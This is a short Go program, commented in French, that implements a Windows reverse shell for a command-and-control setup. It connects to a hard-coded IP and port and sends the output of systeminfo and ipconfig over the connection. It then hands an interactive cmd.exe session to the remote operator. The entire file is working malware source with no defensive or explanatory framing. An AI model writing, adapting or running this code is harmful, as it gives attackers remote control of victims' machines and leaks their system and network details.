package main

import (
	"net"
	"os"
	"os/exec"
)

func main() {
    //modifier l'adresse ip ci-dessous par l'adresse ip de la machine command and control
    conn, err := net.Dial("tcp", "192.168.17.1:8080")
    if err != nil {
        os.Exit(1)
    }

    cmd := exec.Command("cmd.exe")
    systeminfo := exec.Command("systeminfo")

    ipconfig := exec.Command("ipconfig")
    ipconfig.Stdout = conn
    ipconfig.Stderr = conn

    systeminfo.Stdout = conn
    systeminfo.Stderr = conn
    systeminfo.Run()

    ipconfig.Run()

    cmd.Stdin = conn
    cmd.Stdout = conn
    cmd.Stderr = conn

    cmd.Run()

}